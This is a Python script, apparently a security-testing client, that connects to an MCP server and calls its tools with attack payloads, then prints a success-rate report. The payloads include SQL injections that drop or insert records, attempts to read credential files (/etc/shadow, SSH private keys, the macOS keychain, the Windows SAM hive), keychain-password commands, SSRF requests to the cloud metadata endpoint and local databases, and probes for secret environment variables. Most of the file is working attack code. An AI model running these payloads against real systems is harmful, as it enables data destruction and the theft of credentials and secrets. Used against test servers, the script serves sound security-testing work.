import asyncio
import sys
import platform
from typing import Optional
from contextlib import AsyncExitStack
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

class ComprehensiveAttackClient:
    def __init__(self):
        self.session: Optional[ClientSession] = None
        self.exit_stack = AsyncExitStack()
        self.success_metrics = {
            'sql_injection': {'success': 0, 'total': 0},
            'file_access': {'success': 0, 'total': 0},
            'command_execution': {'success': 0, 'total': 0},
            'network_attacks': {'success': 0, 'total': 0},
            'crypto_weaknesses': {'success': 0, 'total': 0},
            'env_exposure': {'success': 0, 'total': 0}
        }
        self.platform = platform.system().lower()

    async def connect_to_server(self, server_script_path: str):
        """Connect to MCP server with cross-platform support"""
        is_python = server_script_path.endswith('.py')
        is_js = server_script_path.endswith('.js')
        if not (is_python or is_js):
            raise ValueError("Server script must be a .py or .js file")
        
        command = "python3" if self.platform in ["darwin", "linux"] else "python"
        server_params = StdioServerParameters(
            command=command,
            args=[server_script_path],
            env=None
        )
        stdio_transport = await self.exit_stack.enter_async_context(stdio_client(server_params))
        self.stdio, self.write = stdio_transport
        self.session = await self.exit_stack.enter_async_context(ClientSession(self.stdio, self.write))
        await self.session.initialize()
        print(f"Connected to server on {self.platform} platform.")

    def get_platform_specific_payloads(self):
        """Get platform-specific attack payloads"""
        if self.platform == "darwin":  # macOS
            return {
                'file_paths': [
                    "/etc/passwd", "/etc/hosts", "/etc/sudoers", "/etc/ssh/sshd_config",
                    "/Users/*/Library/Keychains/login.keychain-db", "/Users/*/Library/Preferences/com.apple.*",
                    "/System/Library/LaunchDaemons/*.plist", "/usr/local/etc/php.ini",
                    "/opt/homebrew/etc/nginx/nginx.conf", "/var/log/system.log"
                ],
                'commands': [
                    "whoami", "id", "uname -a", "ps aux", "netstat -an", "lsof -i",
                    "system_profiler SPSoftwareDataType", "sw_vers", "defaults read",
                    "security find-generic-password -a", "keychain_dump"
                ],
                'env_vars': [
                    "SECRET_KEY", "PATH", "USER", "HOME", "SHELL", "PYTHONPATH", "LANG", "LC_ALL",
                    "USERNAME", "TMPDIR", "LOGNAME", "DISPLAY", "SSH_AUTH_SOCK", "SSH_AGENT_PID",
                    "HOMEBREW_PREFIX", "HOMEBREW_CELLAR", "HOMEBREW_REPOSITORY", "HOMEBREW_SHELLENV_PREFIX",
                    "DYLD_LIBRARY_PATH", "DYLD_FRAMEWORK_PATH", "DYLD_FALLBACK_LIBRARY_PATH",
                    "XPC_SERVICE_NAME", "XPC_FLAGS", "XPC_SERVICE_BOOTSTRAP"
                ]
            }
        elif self.platform == "linux":
            return {
                'file_paths': [
                    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/sudoers", "/etc/ssh/sshd_config",
                    "/proc/version", "/proc/cpuinfo", "/proc/meminfo", "/var/log/auth.log",
                    "/home/*/.ssh/id_rsa", "/home/*/.bash_history", "/etc/crontab"
                ],
                'commands': [
                    "whoami", "id", "uname -a", "ps aux", "netstat -tulpn", "ss -tulpn",
                    "cat /proc/version", "cat /proc/cpuinfo", "df -h", "free -m"
                ],
                'env_vars': [
                    "SECRET_KEY", "PATH", "USER", "HOME", "SHELL", "PYTHONPATH", "LANG", "LC_ALL",
                    "USERNAME", "TMPDIR", "LOGNAME", "DISPLAY", "SSH_AUTH_SOCK", "SSH_AGENT_PID",
                    "XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_CACHE_HOME", "XDG_RUNTIME_DIR"
                ]
            }
        else:  # Windows
            return {
                'file_paths': [
                    "C:\\Windows\\System32\\drivers\\etc\\hosts", "C:\\Windows\\System32\\config\\sam",
                    "C:\\Windows\\System32\\config\\system", "C:\\Windows\\System32\\config\\software",
                    "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
                ],
                'commands': [
                    "whoami", "systeminfo", "netstat -an", "tasklist", "wmic process list",
                    "dir C:\\Windows\\System32", "type C:\\Windows\\System32\\drivers\\etc\\hosts"
                ],
                'env_vars': [
                    "SECRET_KEY", "PATH", "USER", "USERNAME", "HOME", "TEMP", "COMSPEC", "SHELL", "PYTHONPATH",
                    "APPDATA", "LOCALAPPDATA", "PROGRAMFILES", "SYSTEMROOT", "NUMBER_OF_PROCESSORS", "PROCESSOR_IDENTIFIER"
                ]
            }

    async def test_sql_injection(self):
        """Test SQL injection vulnerabilities"""
        print(f"\n[*] Testing SQL Injection on {self.platform}...")
        payloads = [
            "test');--", "' OR 1=1 --", "; DROP TABLE records; --",
            "Robert'); DROP TABLE records;--", "' UNION SELECT 1, 'pwned', 'pwned'--",
            "admin' #", "' OR '' = '", "test', 'malicious');--",
            "'; INSERT INTO records (name, address) VALUES ('hacked', 'exploited');--"
        ]
        
        for payload in payloads:
            try:
                result = await self.session.call_tool("insert_record", 
                    {"name": payload, "address": "123 Exploit St"})
                content = getattr(result, 'content', result)
                if "Record inserted" in str(content) or "error" not in str(content).lower():
                    self.success_metrics['sql_injection']['success'] += 1
            except Exception:
                pass
        self.success_metrics['sql_injection']['total'] = len(payloads)

    async def test_file_access(self):
        """Test file system access vulnerabilities"""
        print(f"\n[*] Testing File Access on {self.platform}...")
        payloads = self.get_platform_specific_payloads()['file_paths']
        
        for payload in payloads:
            try:
                result = await self.session.call_tool("read_file", {"file_path": payload})
                content = getattr(result, 'content', result)
                if content and len(str(content)) > 10:
                    self.success_metrics['file_access']['success'] += 1
            except Exception:
                pass
        self.success_metrics['file_access']['total'] = len(payloads)

    async def test_command_execution(self):
        """Test command execution vulnerabilities"""
        print(f"\n[*] Testing Command Execution on {self.platform}...")
        payloads = self.get_platform_specific_payloads()['commands']
        
        for payload in payloads:
            try:
                result = await self.session.call_tool("execute_command", {"command": payload})
                content = getattr(result, 'content', result)
                if content and "Output:" in str(content):
                    self.success_metrics['command_execution']['success'] += 1
            except Exception:
                pass
        self.success_metrics['command_execution']['total'] = len(payloads)

    async def test_network_attacks(self):
        """Test network-based attacks (SSRF)"""
        print(f"\n[*] Testing Network Attacks on {self.platform}...")
        ssrf_payloads = [
            "http://localhost:22", "http://169.254.169.254/metadata",
            "file:///etc/passwd", "http://internal.service:8080",
            "http://localhost:3306", "http://localhost:5432", "http://localhost:6379"
        ]
        
        for payload in ssrf_payloads:
            try:
                result = await self.session.call_tool("make_request", {"url": payload})
                content = getattr(result, 'content', result)
                if content and "Status:" in str(content):
                    self.success_metrics['network_attacks']['success'] += 1
            except Exception:
                pass
        self.success_metrics['network_attacks']['total'] = len(ssrf_payloads)

    async def test_crypto_weaknesses(self):
        """Test cryptographic weaknesses"""
        print(f"\n[*] Testing Cryptographic Weaknesses on {self.platform}...")
        weak_algos = ["md5", "sha1", "crc32"]
        
        for algo in weak_algos:
            try:
                result = await self.session.call_tool("generate_hash", 
                    {"data": "test", "algorithm": algo})
                content = getattr(result, 'content', result)
                if content and len(str(content)) > 10:
                    self.success_metrics['crypto_weaknesses']['success'] += 1
            except Exception:
                pass
        self.success_metrics['crypto_weaknesses']['total'] = len(weak_algos)

    async def test_env_variable_exposure(self):
        """Test environment variable exposure"""
        print(f"\n[*] Testing Environment Variable Exposure on {self.platform}...")
        env_vars = self.get_platform_specific_payloads()['env_vars']
        
        for var in env_vars:
            try:
                result = await self.session.call_tool("get_env_variable", {"var_name": var})
                content = getattr(result, 'content', result)
                if (isinstance(content, str) and 
                    content != "Variable not found" and 
                    content.strip() not in ["", "''", '""']):
                    self.success_metrics['env_exposure']['success'] += 1
            except Exception:
                pass
        self.success_metrics['env_exposure']['total'] = len(env_vars)

    def generate_report(self):
        """Generate comprehensive attack report"""
        total_success = sum(m['success'] for m in self.success_metrics.values())
        total_tests = sum(m['total'] for m in self.success_metrics.values())
        
        print("\n" + "="*60)
        print(f"COMPREHENSIVE ATTACK REPORT - {self.platform.upper()}")
        print("="*60)
        print(f"Overall Success Rate: {total_success}/{total_tests} ({100 * total_success / total_tests:.1f}%)")
        
        for category, metrics in self.success_metrics.items():
            if metrics['total'] > 0:
                rate = 100 * metrics['success'] / metrics['total']
                print(f"{category.replace('_', ' ').title()}: {metrics['success']}/{metrics['total']} ({rate:.1f}%)")
        
        print("="*60)
        print(f"Platform: {self.platform}")
        print(f"Total Vulnerabilities Found: {total_success}")
        print("="*60)

    async def cleanup(self):
        """Clean up resources"""
        await self.exit_stack.aclose()

async def main():
    if len(sys.argv) < 2:
        print("Usage: python3 comprehensive-attack-client.py <path_to_server_script>")
        sys.exit(1)
    
    client = ComprehensiveAttackClient()
    try:
        await client.connect_to_server(sys.argv[1])
        await client.test_sql_injection()
        await client.test_file_access()
        await client.test_command_execution()
        await client.test_network_attacks()
        await client.test_crypto_weaknesses()
        await client.test_env_variable_exposure()
        client.generate_report()
    finally:
        await client.cleanup()

if __name__ == "__main__":
    asyncio.run(main())



